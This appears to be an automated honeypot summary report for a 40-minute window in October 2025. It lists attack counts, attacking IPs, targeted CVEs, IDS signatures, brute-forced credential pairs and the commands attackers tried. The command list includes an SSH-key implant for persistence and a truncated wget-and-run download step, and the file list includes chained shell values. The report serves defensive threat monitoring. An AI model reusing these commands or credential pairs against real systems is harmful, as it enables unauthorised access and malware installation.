Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-06T21:01:37Z
**Timeframe:** 2025-10-06T20:20:01Z to 2025-10-06T21:00:01Z
**Files Used:**
- agg_log_20251006T202001Z.json
- agg_log_20251006T204001Z.json
- agg_log_20251006T210001Z.json

### Executive Summary
This report summarizes honeypot activity over a period of approximately 40 minutes, based on three log files. A total of 14,608 attacks were recorded across various honeypots. The most targeted services were SMB (TCP/445) and SSH (22). The majority of attacks originated from a diverse set of IP addresses, with a significant number of events linked to the DoublePulsar backdoor.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 4161
- Honeytrap: 3864
- Suricata: 3568
- Ciscoasa: 1185
- Mailoney: 933
- Sentrypeer: 561
- Dionaea: 105
- ElasticPot: 34
- Adbhoney: 34
- Tanner: 43
- H0neytr4p: 29
- Redishoneypot: 28
- ConPot: 18
- Miniprint: 17
- Honeyaml: 17
- Dicompot: 6
- Heralding: 3
- Ipphoney: 2

**Top Attacking IPs:**
- 124.43.237.158: 1590
- 80.94.95.238: 968
- 176.65.141.117: 820
- 103.220.207.174: 791
- 41.226.27.251: 485
- 172.86.95.98: 390
- 172.86.111.108: 283
- 198.23.190.58: 288
- 107.170.232.33: 279
- 198.98.56.227: 263
- 177.53.215.134: 179
- 209.141.62.124: 219
- 151.252.84.225: 219
- 20.203.42.204: 145
- 223.197.248.209: 134
- 111.19.212.140: 118
- 216.155.93.75: 114
- 34.128.77.56: 109
- 107.173.61.177: 103
- 103.115.24.11: 88

**Top Targeted Ports/Protocols:**
- TCP/445: 1610
- 22: 612
- 5060: 561
- 25: 933
- UDP/5060: 156
- 8333: 143
- 9200: 32
- 23: 33
- 80: 50
- 5903: 94
- 8888: 40
- TCP/80: 50

**Most Common CVEs:**
- CVE-2022-27255
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2019-16920
- CVE-2024-12856
- CVE-2024-12885
- CVE-2014-6271
- CVE-2023-52163
- CVE-2023-47565
- CVE-2023-31983
- CVE-2024-10914
- CVE-2009-2765
- CVE-2015-2051
- CVE-2024-33112
- CVE-2022-37056
- CVE-2019-10891
- CVE-2024-3721
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542
- CVE-2021-42013
- CVE-2021-35394
- CVE-2019-11500
- CVE-2021-3449
- CVE-2001-0414
- CVE-2019-12263
- CVE-2019-12261
- CVE-2019-12260
- CVE-2019-12255

**Commands Attempted by Attackers:**
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password: 
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- uname -s -v -n -r -m
- cd /data/local/tmp/; busybox wget ...; sh w.sh; ...

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Dshield Block Listed Source group 1
- ET SCAN Sipsak SIP scan
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 43
- ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255)
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- ET INFO CURL User Agent

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- ubuntu/3245gs5662d34
- admin/110484
- admin/110479
- admin/11031979
- admin/11031975
- admin/11021978
- scanner/scanner12
- qiuhan/123
- elasticsearch/elasticsearchelasticsearch
- amir/Password1
- amir/3245gs5662d34
- user01/user01!
- jenkins/Password123!
- user/123vanda123
- admin/Qwe12345.
- root/welcome@123
- github/github21
- vpn/password1

**Files Uploaded/Downloaded:**
- wget.sh;
- w.sh;
- c.sh;
- Space.mips;
- apply.cgi
- cfg_system_time.htm
- rondo.dgx.sh||busybox
- rondo.dgx.sh||curl
- rondo.tkg.sh|sh&echo
- server.cgi?func=server02_main_submit...
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3

**HTTP User-Agents:**
- No user agents recorded.

**SSH Clients:**
- No SSH clients recorded.

**SSH Servers:**
- No SSH servers recorded.

**Top Attacker AS Organizations:**
- No attacker AS organizations recorded.

### Key Observations and Anomalies
- The high number of events related to the DoublePulsar backdoor suggests a targeted campaign to exploit SMB vulnerabilities.
- A significant number of commands are focused on reconnaissance, such as checking system information (`uname`, `lscpu`, `cat /proc/cpuinfo`).
- Many attackers attempted to add their own SSH key to the `authorized_keys` file for persistent access.
- Several commands indicate attempts to download and execute malicious scripts using `wget` and `curl`.
- The variety of CVEs targeted indicates a broad-spectrum scanning approach by many attackers.
- The most frequent login attempts used common default credentials (e.g., 'admin', 'root', 'user01').
- The lack of HTTP User-Agents, SSH clients, and AS organizations data may indicate that these fields were not consistently logged or that the attacks did not involve these protocols in a way that would be logged.
